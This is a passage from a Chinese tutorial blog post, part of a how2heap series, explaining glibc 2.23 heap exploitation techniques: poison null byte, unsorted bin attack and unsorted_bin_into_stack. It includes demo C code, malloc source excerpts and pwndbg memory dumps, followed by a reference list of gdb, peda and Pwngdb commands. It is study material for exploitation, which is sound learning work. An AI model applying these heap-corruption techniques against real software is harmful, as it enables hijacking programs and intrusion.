<p>这一步确保了我们之后进行 null byte 溢出后，还能成功 free(b)，逃过** ‘chunksize(P) != prev_size (next_chunk(P))’** 的检查。<br>之后分配 b1 和 b2 的时候，presize 也会一直在(b+0x1f0)处更新。<br>而在最后 free(c)的时候，检查的是 c 的 presize 位，而因为最开始的 null byte 溢出，导致这块区域的值一直没被更新，一直是 b 最开始的大小 0x210 。<br>我们知道，两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出 fake chunk b 是 free chunk 的样子。然后释放 chunk c，因为 chunk c 的 prevsize 没有变化，这个时候 chunk c 会认为 chunk b1 就是 chunk b，这时程序会发现 chunk c 的前一个 chunk 是一个 free chunk，然后就将它们合并在了一起，并从 unsorted bin 中取出来合并进了 top chunk。 chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块区域都是未分配的。</p>
<blockquote>
<p>补充：</p>
</blockquote>
<p>chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个 chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否则，合并进 top chunk：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* consolidate backward */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    [...]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">    consolidate into top</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>d = malloc(0x300);之后<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-79.png#clientId=u347f053a-7aac-4&from=paste&height=292&id=u8ac32d1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=584&originWidth=856&originalType=binary&size=322110&status=done&style=none&taskId=u180d0ab4-b269-41a1-82ba-b7916de8294&width=428" alt="image.png"><br>返回的地址还是原来 b 的地址（0x8008120-0x10)，刚才没有 free 的 b2 也被包含在了里面<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-80.png#clientId=u347f053a-7aac-4&from=paste&height=221&id=u0df4b579&margin=%5Bobject%20Object%5D&name=image.png&originHeight=441&originWidth=728&originalType=binary&size=273747&status=done&style=none&taskId=ue4446f69-2c7e-4ee8-84e6-a39289eafa7&width=364" alt="image.png"><br>查看 b2 内容<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-81.png#clientId=u347f053a-7aac-4&from=paste&height=402&id=u2001de99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1817&originalType=binary&size=1146578&status=done&style=none&taskId=u0b17fedc-0d1f-4bbb-84a2-a65830e45a9&width=908.5" alt="image.png"><br>该技术适用的场景需要某个 malloc 的内存区域存在一个单字节溢出漏洞。通过溢出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。<br>对于单字节溢出的利用有下面几种：</p>
<ul>
<li>扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而造成进一步的溢出。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x100</span>   <span class="number">0x100</span>    <span class="number">0x80</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   初始状态</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   释放 B</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="number">0x180</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>)</span><br><span class="line">|-------|-------|-------|   C 块被覆盖</span><br><span class="line">        |&lt;--实际得到的块-&gt;|</span><br></pre></td></tr></table></figure>

<ul>
<li>扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一步溢出。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x100</span>   <span class="number">0x100</span>    <span class="number">0x80</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   初始状态</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="number">0x180</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   释放 B</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>)</span><br><span class="line">|-------|-------|-------|   C 块被覆盖</span><br><span class="line">        |&lt;--实际得到的块-&gt;|</span><br></pre></td></tr></table></figure>

<ul>
<li>收缩被释放块(即本题)：此情况针对溢出的字节只能为 0 的时候，也就是本节所说的 poison-null-byte，此时将下一个被释放的块大小缩小，如此一来在之后分裂此块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x100</span>     <span class="number">0x210</span>     <span class="number">0x80</span></span><br><span class="line">|-------|---------------|-------|</span><br><span class="line">|   A   |       B       |   C   |   初始状态</span><br><span class="line">|-------|---------------|-------|</span><br><span class="line">|   A   |       B       |   C   |   释放 B</span><br><span class="line">|-------|---------------|-------|</span><br><span class="line">|   A   |       B       |   C   |   溢出 B 的 size 为 <span class="number">0x200</span></span><br><span class="line">|-------|---------------|-------|   之后的 <span class="built_in">malloc</span> 操作没有更新 C 的 prev_size</span><br><span class="line">         <span class="number">0x100</span>  <span class="number">0x80</span></span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>), <span class="built_in">malloc</span>(<span class="number">0x80</span><span class="number">-8</span>)</span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   释放 B1</span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   释放 C，C 将与 B1 合并</span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>)</span><br><span class="line">|-------|------|-----|--|-------|   B2 将被覆盖</span><br><span class="line">        |&lt;实际得到的块&gt;|</span><br></pre></td></tr></table></figure>

<h1 id="unsorted-bin-attack-2-23"><a href="#unsorted-bin-attack-2-23" class="headerlink" title="unsorted_bin_attack-2.23"></a>unsorted_bin_attack-2.23</h1><p>这个例程通过 unsortedbin 攻击往栈中写入一个 unsigned long 的值。<br>在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。<br>比如，我们在栈上有一个栈单元 stack_var 需要被改写<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-82.png#clientId=u347f053a-7aac-4&from=paste&height=363&id=u7d59295c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1261&originalType=binary&size=1096913&status=done&style=none&taskId=u89bded64-5af6-47f4-924f-79af335cdee&width=630.5" alt="image.png"><br>然后正常地分配一个 chunk。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-83.png#clientId=u347f053a-7aac-4&from=paste&height=382&id=u2ffbb479&margin=%5Bobject%20Object%5D&name=image.png&originHeight=763&originWidth=1317&originalType=binary&size=1001146&status=done&style=none&taskId=u9f9e017f-e53d-45c3-8392-e81c850ad3d&width=658.5" alt="image.png"><br>再分配一个，防止前一个 chunk 在 free 的时候被合并了。<br>然后 free(p);之后 p 会被插入到 unsortedbin 链表中，它的 fd 和 bk 都指向 unsortedbin 的 head。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-84.png#clientId=u347f053a-7aac-4&from=paste&height=411&id=ue0445c3d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=821&originWidth=1273&originalType=binary&size=926264&status=done&style=none&taskId=u78523055-0f89-49a0-b52c-064720e5b68&width=636.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-85.png#clientId=u347f053a-7aac-4&from=paste&height=203&id=u2f7a2bd4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=405&originWidth=700&originalType=binary&size=169863&status=done&style=none&taskId=ub7295ae7-dad7-4660-93cc-0a102a030ea&width=350" alt="image.png"><br>接着我们模拟一个漏洞攻击改写 p 的 bk 指针：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-86.png#clientId=u347f053a-7aac-4&from=paste&height=311&id=u9296eb09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=622&originWidth=1428&originalType=binary&size=739966&status=done&style=none&taskId=udf20161b-ffa2-4891-a78c-e634bd5c40b&width=714" alt="image.png"><br>然后 malloc<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-87.png#clientId=u347f053a-7aac-4&from=paste&height=424&id=ua20c418c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=848&originWidth=1326&originalType=binary&size=997797&status=done&style=none&taskId=u32fd2ae3-917b-48d2-b75f-4af6bd9b269&width=663" alt="image.png"><br>然后<strong>stack_var</strong>的值就被改写成了 unsortedbin 的 head 的地址了。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-88.png#clientId=u347f053a-7aac-4&from=paste&height=31&id=uf7fabbe9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=61&originWidth=461&originalType=binary&size=19308&status=done&style=none&taskId=uff3920b9-bf5d-41e3-acc8-d4bdc28317d&width=230.5" alt="image.png"><br>之前的 unsafe_unlink 是通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。<br>可以参考这一篇：<a target="_blank" rel="noopener" href="https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/">Pwn 的挖坑填坑之旅</a><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-89.png#clientId=u347f053a-7aac-4&from=paste&height=114&id=ufc44a364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=1230&originalType=binary&size=36359&status=done&style=none&taskId=u3dba95ad-3e7f-4983-9930-9ec41b88f5d&width=615" alt="image.png"></p>
<h1 id="unsorted-bin-into-stack-2-23"><a href="#unsorted-bin-into-stack-2-23" class="headerlink" title="unsorted_bin_into_stack-2.23"></a>unsorted_bin_into_stack-2.23</h1><p>例子源码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">        <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">        <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">        <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">        stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">        stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*S</span></span><br><span class="line"><span class="string">IZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">        victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">        victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">        <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">        <span class="built_in">memcpy</span>((p2+<span class="number">40</span>), ≻, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">        assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本题 unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。<br>初始栈<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-90.png#clientId=u38185df4-f4d6-4&from=paste&height=169&id=u10f80e0e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=857&originalType=binary&size=239052&status=done&style=none&taskId=u384c129f-04ad-4a88-b95e-d38c2445330&width=593.5" alt="image.png"><br>先 malloc 一个 victim 块<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-91.png#clientId=u38185df4-f4d6-4&from=paste&height=168&id=u4ef9ac2b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=561&originalType=binary&size=171711&status=done&style=none&taskId=ucc095613-3559-47fc-acbe-4799fd59cbb&width=280.5" alt="image.png"><br>再分配一个防止 free 的时候和 top chunk 合并。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-92.png#clientId=u38185df4-f4d6-4&from=paste&height=219&id=u593caa2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=437&originWidth=739&originalType=binary&size=274303&status=done&style=none&taskId=u3d672eb4-d629-46c2-818c-6ed05935421&width=369.5" alt="image.png"><br>接下来释放 p<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-93.png#clientId=u38185df4-f4d6-4&from=paste&height=246&id=u8713a8b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=630&originalType=binary&size=283418&status=done&style=none&taskId=ufc8a4875-9011-4a1b-90f7-f38cfbfc398&width=315" alt="image.png"><br>可以看到它插入了 unsorted bin 列表中<br>我们要在栈上构造一个 chunk，</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br></pre></td></tr></table></figure>

<p>查看此时内存布局</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx victim - <span class="number">2</span></span><br><span class="line"><span class="number">0x8008010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000111</span> &lt;-- victim chunk</span><br><span class="line"><span class="number">0x8008020</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x00007fffff3f3b78</span></span><br><span class="line"><span class="number">0x8008030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">4</span>gx stack_buffer</span><br><span class="line"><span class="number">0x7ffffffed9a0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000110</span>  &lt;-- fake chunk</span><br><span class="line"><span class="number">0x7ffffffed9b0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffffffed9a0</span></span><br></pre></td></tr></table></figure>

<p>然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure>

<p>这里的 size = 32，只要是一个合理的范围，比之后要申请的 chunk size 要小就行。然后我们把 victim-&gt;bk 的值赋为 stack_buffer</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx victim - <span class="number">2</span></span><br><span class="line"><span class="number">0x8008010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000020</span>   &lt;-- victim chunk</span><br><span class="line"><span class="number">0x8008020</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x00007ffffffed9a0</span>   &lt;-- bk pointer</span><br><span class="line"><span class="number">0x8008030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-94.png#clientId=u38185df4-f4d6-4&from=paste&height=321&id=uc4f1b5a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=1051&originalType=binary&size=657454&status=done&style=none&taskId=u3fca205b-d8a5-417e-96c2-cd41a462aa2&width=525.5" alt="image.png"><br>过程如下：<br>​</p>
<p>首先 victim chunk 被从 unsorted bin 中取出：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>显然这个 chunk 的大小是不够的，所以被放入 small bin 中。<br>现在再从 unsorted bin 拿出一个被构造的 fake chunk ，现在有了一些检查：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                         &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>大小合理，轻松绕过。而另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx victim - <span class="number">2</span></span><br><span class="line"><span class="number">0x8008010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x8008020</span>:      <span class="number">0x00007fffff3f3b88</span>      <span class="number">0x00007fffff3f3b88</span></span><br><span class="line"><span class="number">0x8008030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Pwngdb"><a href="#Pwngdb" class="headerlink" title="Pwngdb"></a>Pwngdb</h2><p>libc : Print the base address of libc<br>ld : Print the base address of ld<br>codebase : Print the base of code segment<br>heap : Print the base of heap<br>got : Print the Global Offset Table infomation<br>dyn : Print the Dynamic section infomation<br>findcall : Find some function call<br>bcall : Set the breakpoint at some function call<br>tls : Print the thread local storage address<br>at : Attach by process name<br>findsyscall : Find the syscall<br>force : Calculate the nb in the house of force.<br>heapinfo :打印 heap 的一些信息<br>heapinfoall : Print some infomation of heap (all threads)<br>arenainfo : Print some infomation of all arena<br>chunkptr : 打印 chunk 的信息 后面加 chunk 返回给用户的地址<br>printfastbin : 打印 fastbin 的链表信息<br>tracemalloc on : 追踪程序 chunk 的 malloc 和 free<br>parseheap :解析堆的布局<br>magic : 打印出 glibc 中一些有用的信息<br>fp : show FILE structure<br>fp (Address of FILE)</p>
<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>top_chunk: 显示 top chunk 的信息<br>malloc_chunk address:打印出已被分配的 chunk 的信息<br>fastbins:显示 fastbins 链表信息<br>unsorted:显示 unsortedbin 的信息<br>smallbins:显示 smallbins 的信息<br>largebins:显示 largebins 的信息<br>bins:显示所有 bins 的信息<br>mp：显示一些内存管理用到的全局变量<br>arena：显示分配区的信息</p>
<h2 id="peda-基础命令"><a href="#peda-基础命令" class="headerlink" title="peda 基础命令"></a>peda 基础命令</h2><p>​</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">file 路径　-　附加文件</span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x400100</span> (b main) - 在 <span class="number">0x400100</span> 处下断点</span><br><span class="line">tb  - 一次性断点</span><br><span class="line">info b - 查看断点信息</span><br><span class="line">enable   -   激活断点</span><br><span class="line">disable  -   禁用断点</span><br><span class="line"><span class="keyword">delete</span> [number]  -  删除断点</span><br><span class="line">watch *(<span class="keyword">int</span> *)<span class="number">0x08044530</span>  -  在内存<span class="number">0x0804453</span>处的数据改变时stop</span><br><span class="line">p $eax - 输出eax的内容</span><br><span class="line"><span class="built_in">set</span> $eax=<span class="number">4</span> - 修改变量值</span><br><span class="line"></span><br><span class="line">c - 继续运行</span><br><span class="line">r - 开始运行</span><br><span class="line">ni - 单步步过</span><br><span class="line">si - 单步步入</span><br><span class="line">fini - 运行至函数刚结束处</span><br><span class="line"><span class="keyword">return</span> expression - 将函数返回值指定为expression</span><br><span class="line">bt - 查看当前栈帧</span><br><span class="line">info f - 查看当前栈帧</span><br><span class="line">context - 查看运行上下文</span><br><span class="line"><span class="built_in">stack</span> - 查看当前堆栈</span><br><span class="line">call func - 强制函数调用</span><br><span class="line"><span class="built_in">stack</span> <span class="number">100</span> - 插件提供的，显示栈中<span class="number">100</span>项</span><br><span class="line">find xxx　 - 快速查找，很实用</span><br><span class="line"></span><br><span class="line">x/&lt;n/f/u&gt; &lt;addr&gt;     n、f、u是可选的参数。</span><br><span class="line">x /<span class="number">4</span>xg $ebp：查看ebp开始的<span class="number">4</span>个<span class="number">8</span>字节内容</span><br><span class="line">x/wx $esp 　　以<span class="number">4</span>字节<span class="number">16</span>进制显示栈中内容</span><br><span class="line">b表示单字节，h表示双字节，w表示四字 节，g表示八字节</span><br><span class="line">s 按字符串输出</span><br><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">i：反汇编</span><br><span class="line"></span><br><span class="line">但是实际的组合就那么几种：</span><br><span class="line">x/s 地址　　查看字符串</span><br><span class="line">x/wx 地址　　查看DWORD</span><br><span class="line">x/c 地址　　单字节查看</span><br><span class="line">x/<span class="number">16</span>x $esp+<span class="number">12</span> 查看寄存器偏移</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> args  - 可指定运行时参数。（如：<span class="built_in">set</span> args <span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span> <span class="number">50</span>）</span><br><span class="line">show args  - 命令可以查看设置好的运行参数。</span><br></pre></td></tr></table></figure>

<h2 id="peda-插件命令"><a href="#peda-插件命令" class="headerlink" title="peda 插件命令"></a>peda 插件命令</h2><ul>
<li>aslr - 显示/设定 GDB 的 ASLR(地址空间配置随机加载)设置</li>
</ul>
<p>gdb-peda$ aslr ASLR is OFF</p>
<ul>
<li>checksec - 检查二进制文件的各种安全选项</li>
</ul>
<p>gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</p>
<ul>
<li>dumpargs - 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</li>
<li>dumprop - 在给定内存范围中 Dump 出所有 ROP gadgets</li>
<li>elfheader - 从被调试的 ELF 文件中获取标题信息</li>
<li>elfsymbol - 从 ELF 文件获取非调试符号信息（plt 表）</li>
<li>lookup - 搜索所有地址/参考地址属于一个内存范围</li>
<li>patch - 修补程序内存以 string / hexstring / int 的地址开始</li>
<li>procinfo - 显示/ proc / pid /</li>
<li>pshow - 显示各种 PEDA 选项和其他设置</li>
<li>pset - 设置各种 PEDA 选项和其他设置</li>
<li>pattern - 生成字符串模板 写入内存 用于定位溢出点<ul>
<li>pattern create size 生成特定长度字符串</li>
<li>pattern offset value 定位字符串</li>
</ul>
</li>
<li>procinfo – Display various info from /proc/pid/</li>
<li>pshow – Show various PEDA options and other settings</li>
<li>pset– Set various PEDA options and other settings</li>
<li>readelf - 从 ELF 文件获取标题信息</li>
<li>ropgadget - 获取二进制或库的通用 ROP 小工具</li>
<li>ropsearch - 在内存中搜索 ROP 小工具</li>
<li>searchmem - 用搜索内存<ul>
<li>searchmem|find - 在内存中查找字符串，支持正则表达式，例如 searchmem “/bin/sh” libc</li>
</ul>
</li>
<li>shellcode - 生成或下载常用的 shellcode。</li>
<li>skeleton - 生成 python 漏洞利用代码模板</li>
<li>vmmap - 可以用来查看栈、bss 段是否可以执行</li>
<li>xormem - 用一个键异或存储区域</li>
<li>ptype struct link_map - 查看 link_map 定义</li>
<li>p &amp;((struct link_map*)0)-&gt;l_info - 查看 l_info 成员偏移</li>
</ul>
